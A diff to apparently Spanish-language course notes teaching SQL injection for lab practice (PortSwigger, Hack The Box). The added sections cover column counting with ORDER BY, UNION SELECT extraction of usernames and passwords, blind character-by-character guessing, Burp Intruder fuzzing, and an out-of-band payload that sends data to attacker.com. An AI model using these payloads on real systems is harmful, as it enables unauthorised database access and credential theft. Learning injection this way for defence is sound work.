@@ -46,6 +46,104 @@ SELECT * FROM users WHERE user='admin' OR '1=1' --' AND pass=''
 
 ---
 
+## Niveles de una base de datos (para atacar con criterio)
+
+Antes de atacar, hay que entender la estructura de una BD:
+
+| Nivel | Qué es | Ejemplo |
+|---|---|---|
+| **Servidor** | Máquina donde corre la BD | PostgreSQL, MySQL |
+| **Base de datos** | Contenedor principal | `megacorp` |
+| **Esquema** | BD activa dentro del servidor | `public` |
+| **Tabla** | Conjunto de registros | `cars` |
+| **Columna** | Campo de cada registro | `name`, `type`, `fuel` |
+| **Fila/Dato** | Contenido real | `Toyota, Sedán, Gasolina` |
+
+> [!important] Por qué importa esto
+> Para hacer una query necesitas saber: servidor → BD → esquema → tabla → columna → dato. Si no tienes esta información, no puedes extraer nada.
+
+---
+
+## Clasificación de SQLi
+
+| Categoría | Tipos | Cómo recibes la info |
+|---|---|---|
+| **Inband (clásica)** | Error-based, Union-based | Los datos salen en la **misma respuesta HTTP** |
+| **Blind (inferencial)** | Boolean-based, Time-based | No ves datos, solo **observas comportamiento** |
+| **Out of Band** | DNS/HTTP exfil | Los datos salen por un **canal distinto** (collaborator) |
+
+> [!important] Resumen en una frase
+> - **Inband:** "Los veo en pantalla"
+> - **Blind:** "Los deduzco por comportamiento"
+> - **Out of Band:** "Los recibo por otro sitio"
+
+---
+
+## Metodología manual paso a paso
+
+> [!example] Flujo completo (Basin / PortSwigger): detectar → contar → inyectar → extraer
+
+```
+PASO 0: Detectar
+  search=a'  → Error de SQL ✓
+
+PASO 1: Contar columnas
+  search=a' ORDER BY 1--  → OK
+  search=a' ORDER BY 2--  → OK
+  search=a' ORDER BY 3--  → OK
+  search=a' ORDER BY 4--  → OK
+  search=a' ORDER BY 5--  → OK
+  search=a' ORDER BY 6--  → ERROR
+  Resultado: 5 columnas
+
+PASO 2: UNION SELECT
+  search=a' UNION SELECT NULL,NULL,NULL,NULL,NULL--  → OK (fila vacía)
+
+PASO 3: Columnas visibles
+  search=a' UNION SELECT 1,NULL,NULL,NULL,NULL--  → Aparece 1
+  search=a' UNION SELECT NULL,2,NULL,NULL,NULL--  → Aparece 2
+  Resultado: columnas 1 y 2 son visibles
+
+PASO 4: Tipo de datos
+  search=a' UNION SELECT 'a','b','c','d','e'--  → Aparecen 'a' y 'b'
+  Resultado: columnas 1 y 2 son de tipo string
+
+PASO 5: Extraer datos
+  search=a' UNION SELECT username,password,NULL,NULL,NULL FROM users--
+```
+
+### Detección — Paso 0 (la prueba de la comilla)
+
+```
+http://target/index.php?search=a'
+```
+
+Si la página devuelve un **error de SQL**, hay vulnerabilidad:
+
+```sql
+SELECT * FROM cars WHERE name LIKE '%a'%'
+                                  ^-- Error aquí
+```
+
+> [!info] Qué buscar en el error
+> - `You have an error in your SQL syntax`
+> - `Query failed`
+> - `MySQL server version`
+> - Cualquier mensaje que muestre la consulta SQL
+
+### Confirmar con OR 1=1
+
+```
+http://target/index.php?search=a' OR 1=1--
+```
+
+Si devuelve **TODOS los resultados** (no solo los que empiezan por "a"), confirmas que hay SQLi.
+
+> [!warning] Probar SIEMPRE comilla simple Y doble
+> Si una no funciona, la otra puede funcionar. Depende de cómo esté escrita la query por detrás: `parameter='` → 500 / `parameter=''` → 200 / `parameter="` → 500 / `parameter=""` → 200.
+
+---
+
 ## Técnicas de SQLi
 
 ### 1. UNION-based
@@ -58,9 +156,57 @@ Usa `UNION SELECT` para combinar resultados de otras tablas en la respuesta orig
 ' UNION SELECT null,username,password FROM users-- 
 ```
 
-> [!tip] Requisitos
-> - Las columnas del UNION deben coincidir en número y tipo con la query original
+> [!tip] Las dos reglas de oro (UNION)
+> 1. **Mismo número de columnas** que la query original
+> 2. **Tipos compatibles** (string con string, num con num)
 > - Se usa para extraer datos directamente visibles en la página
+
+### Contar columnas — ORDER BY vs NULL
+
+```sql
+ORDER BY 1--    -- Funciona (hay al menos 1 columna)
+ORDER BY 2--    -- Funciona
+ORDER BY 5--    -- ERROR (no hay 5 columnas)
+```
+
+> [!important] La regla
+> Si `ORDER BY N` funciona y `ORDER BY N+1` da error, la tabla tiene **N columnas**.
+
+También se puede contar con `NULL` (compatible con **cualquier tipo de dato**):
+
+```sql
+' UNION SELECT NULL--           → ERROR
+' UNION SELECT NULL,NULL--      → ERROR
+' UNION SELECT NULL,NULL,NULL-- → OK (3 columnas)
+```
+
+> [!tip] ORDER BY vs NULL
+> - `ORDER BY`: Cuando peta, el número **anterior** es el correcto (ORDER BY 4 peta → 3 columnas)
+> - `NULL`: Cuando peta, es el número que **pusiste** (UNION SELECT NULL,NULL,NULL,NULL peta → 3 era correcto)
+
+### Identificar columnas visibles
+
+```sql
+UNION SELECT 1,NULL,NULL,NULL,NULL--    -- ¿Aparece el 1?
+UNION SELECT NULL,2,NULL,NULL,NULL--    -- ¿Aparece el 2?
+```
+
+Las posiciones donde **aparezca un número** son las columnas visibles en el HTML.
+
+### Identificar tipo de datos
+
+```sql
+UNION SELECT 'a','b','c','d',5--
+```
+
+| Resultado | Tipo de columna |
+|---|---|
+| Aparece la letra | String/VARCHAR |
+| Aparece el número | Numérico/INT |
+| Error (500) | Tipo incompatible |
+
+> [!warning] Cuidado con los tipos
+> Si la columna es `INT` y metes un `string`, la query peta (500). Si es `VARCHAR` y metes un número, a veces funciona (lo detecta como string) pero no siempre.
 
 ### 2. Error-based
 
@@ -85,6 +231,21 @@ La respuesta cambia según si la condición es verdadera o falsa:
 ' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=8-- 
 ```
 
+> [!example] Ejemplo con tracking cookie (PortSwigger)
+> ```
+> TrackingId=xyz' AND 1=1--  → Welcome back (TRUE)
+> TrackingId=xyz' AND 1=2--  → No aparece (FALSE)
+> ```
+> La consulta detrás: `SELECT * FROM tracking WHERE tracking_id = 'xyz'` — si la consulta es `WHERE id = 'valor'`, necesitas cerrar la comilla antes de inyectar.
+
+Para extraer datos carácter a carácter:
+
+```sql
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='administrator')='a'--
+```
+
+Si TRUE → la primera letra del usuario es 'a'. Si FALSE → probamos con 'b', 'c', etc. **Esto es MUY lento**, pero funciona.
+
 #### Time-based
 
 La respuesta no cambia, pero el **tiempo de respuesta** sí:
@@ -96,6 +257,73 @@ La respuesta no cambia, pero el **tiempo de respuesta** sí:
 
 > [!warning] Blind SQLi es lento
 > Cada carácter se pregunta por separado. Con un password de 32 chars × 26 posiciones = hasta 832 requests. Por eso se usa automatización (SQLMap).
+
+### 4. Out of Band (DNS/HTTP exfil)
+
+Ni vemos contenido, ni hay cambios, ni hay tiempos. Los datos salen por un **canal externo** que nosotros controlamos (Burp Collaborator o servidor propio):
+
+```sql
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\file'))--
+```
+
+La BD hace una petición DNS a nuestro servidor con la versión de la BD.
+
+> [!important] Cuándo usar Out of Band
+> Cuando no hay output visible, no hay cambio de comportamiento ni diferencia de tiempos — el único canal es una conexión saliente que el servidor puede abrir.
+
+---
+
+## Explotar desde Burp Suite (Repeater)
+
+### Por qué no desde el navegador
+
+- Se pierde el URL encode
+- Las consultas son largas y se cortan
+- No puedes reenviar peticiones modificadas fácilmente
+
+### Flujo
+
+1. Activar Foxy Proxy (127.0.0.1:8080)
+2. Login + buscar algo en la web
+3. Burp → Proxy → HTTP History → localizar la petición
+4. Clic derecho → **Send to Repeater**
+5. En Repeater: modificar el parámetro libremente (comillas, OR, UNION), ver respuesta completa (HTML, headers, status code), iterar rápido sin recargar la web
+
+---
+
+## Fuzzing con Burp Intruder (detección automatizada)
+
+### Paso 1: Mapear la aplicación
+
+1. Activar Foxy Proxy + Burp
+2. Ir a Target → Scope → Añadir URL
+3. **Hacer clic en TODOS los botones** de la web
+4. En HTTP History → Ordenar por **parámetros**
+
+### Paso 2: Identificar parámetros únicos
+
+- Marcar en **naranja** los parámetros nuevos (primera vez que aparecen)
+- Enviar al **Repeater** los parámetros únicos
+- Ignorar parámetros repetidos (mismo nombre, diferente valor)
+
+### Paso 3: Fuzzing con Intruder
+
+1. En el Repeater, enviar la petición al Intruder (Ctrl+I)
+2. En Intruder → Positions → **Clear** y marcar el parámetro a testear
+3. Cargar lista de payloads (SQLi, XSS, LFI, etc.)
+4. **Start Attack**
+
+### Paso 4: Analizar resultados
+
+| Campo | Qué buscar |
+|---|---|
+| **Status code** | Un código diferente al resto (ej: 500 cuando todos dan 302) |
+| **Length** | Una longitud de respuesta diferente |
+| **Error** | Mensajes de error que no aparecen en otros payloads |
+| **Timeout** | Respuestas que tardan más (time-based) |
+
+> [!important] Una respuesta diferente = posible vulnerabilidad
+> Si 999 payloads dan igual y 1 da diferente, **ahí hay oro**. Ir al Repeater y testear manualmente.
 
 ---
 
@@ -227,12 +455,20 @@ $stmt->execute(['user' => $u, 'pass' => $p]);
 - [ ] Entiendo que prepared statements eliminan la vulnerabilidad
 - [ ] Conozco la conexión entre SQLi, XXE, Path Traversal y LFI
 - [ ] Recuerdo: el vulnerable es el PHP, no la DB ni el servidor
+- [ ] Sé detectar SQLi con comilla simple y confirmar con OR 1=1
+- [ ] Cuento columnas con ORDER BY y con UNION SELECT NULL
+- [ ] Identifico columnas visibles y sus tipos de datos antes de extraer
+- [ ] Distingo Inband, Blind y Out of Band según dónde salga la info
+- [ ] Exploto con Burp Repeater (no desde la barra de direcciones)
+- [ ] Mapeo la app → parámetros únicos → Intruder → busco respuestas anómalas
 
 ---
 
 ## Tags
 
-#web #sqli #owasp #injection #prepared-statements #sqlmap #blue-team
+#web #sqli #owasp #injection #prepared-statements #sqlmap #blue-team #order-by #union-select #blind #out-of-band #burp #intruder #repeater #portswigger
+
+
 
 
 
@@ -246,24 +482,23 @@ $stmt->execute(['user' => $u, 'pass' => $p]);
 
 ### Documentos Relacionados
 
-- [[../../transcripciones/Junio/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Escalada de Privilegios, Netcat / Reverse Shells, SQLMap
-- [[OWASP Top 10 - CVE CVSS CWE.md|OWASP Top 10 - CVE CVSS CWE]] — Hack The Box, Metasploit, SQLMap
-- [[../../apuntes Andres/20.07.2026 PortSwigger SSRF.md|20.07.2026 PortSwigger SSRF]] — Metasploit, Netcat / Reverse Shells, SQL Injection
-- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]] — Escalada de Privilegios, Metasploit, SQL Injection
-- [[../../apuntes Andres/11.07.2026 Owasp Top 10 XXE Labs II.md|11.07.2026 Owasp Top 10 XXE Labs II]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Andres/03.09.2026 OWASP API Top 10 La API habla de más.md|03.09.2026 OWASP API Top 10 La API habla de más]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
+- [[../../apuntes Andres/10.09.2026 SQLi Inyecciones - Labs III.md|10.09.2026 SQLi Inyecciones - Labs III]] — SQL Injection, Testing, Burp Suite
+- [[../../apuntes Andres/15.09.2026 SQLi - Inyecciones - Labs - Avanzado II.md|15.09.2026 SQLi - Inyecciones - Labs - Avanzado II]] — SQL Injection, Inband, Blind, Out of Band
+- [[../../apuntes Andres/08.09.2026 SQLi Inyecciones - Labs I.md|08.09.2026 SQLi Inyecciones - Labs I]] — SQL Injection, Funcional, Testing
+- [[../../apuntes Andres/07.09.2026 SQLi - Fundamentos de SQL.md|07.09.2026 SQLi - Fundamentos de SQL]] — SQL Injection, Database, Testing
+- [[../../apuntes Chema/2026-09-10 - SQL Injection manual - Carlos Castillo.docx.md|2026-09-10 SQL Injection manual - Carlos Castillo]] — SQL Injection, Manual, Testing
+- [[../../apuntes Chema/15-09-2026 - SQL Injection - Yuba González Parrilla.docx.md|15-09-2026 SQL Injection - Yuba González Parrilla]] — SQL Injection, Inband, Blind
+- [[../../apuntes Chema/Apuntes_SQLi_Inyecciones_Labs_I_2026-09-08.docx.md|Apuntes SQLi Inyecciones Labs I]] — SQL Injection, Testing, Burp Suite
+- [[../../apuntes Chema/PortSwigger_SQLi_I_2026-09-22_v001.docx.md|PortSwigger SQLi I]] — SQL Injection, PortSwigger, Testing
+- [[../../apuntes Andres/29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web.md|29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web]] — Linux, Post-Explotacion, XXE
+- [[../../apuntes Andres/03.09.2026 OWASP API Top 10 La API habla de más.md|03.09.2026 OWASP API Top 10 La API habla de más]] — Hack The Box, SQL Injection, XXE
+- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Netcat / Reverse Shells, SQL Injection
+- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]] — Blue Team / SOC, SQL Injection, XXE
+- [[OWASP Top 10 - CVE CVSS CWE.md|OWASP Top 10 - CVE CVSS CWE]] — Blue Team / SOC, SQL Injection, XXE
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/SQLMap|SQLMap]]
+- [[../../../programacion/Rust/fundamentos_rust.md|fundamentos_rust]] — Programacion: Desarrollo Web, Linux, Manejo de Errores
+- [[../../../programacion/Go/seguridad_go.md|seguridad_go]] — Programacion: Desarrollo Web, Linux, SQL
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
-- [[Apuntes/05 - Auditoria Web/Path Traversal - 6 Casos y Bypasses.md|Path Traversal / LFI]]
-- [[Apuntes/05 - Auditoria Web/SSRF - Server-Side Request Forgery.md|SSRF]]
-- [[Apuntes/05 - Auditoria Web/XXE - XML External Entity.md|XXE]]
-
-> #blue-team #command-injection #escalada-privilegios #hack-the-box #lfi #linux #metasploit #netcat #post-explotacion #redes #reverse-shell #sqli #sqlmap #ssrf #xxe
+> #blue_team #cli #command_injection #crypto #database #error_handling #escalada_privilegios #go #hack_the_box #java #lfi #linux #linux_ciber #metasploit #netcat #post_explotacion #redes #redes_ciber #reverse_shell #sql #sqli #sqlmap_tool #ssrf #web #xxe
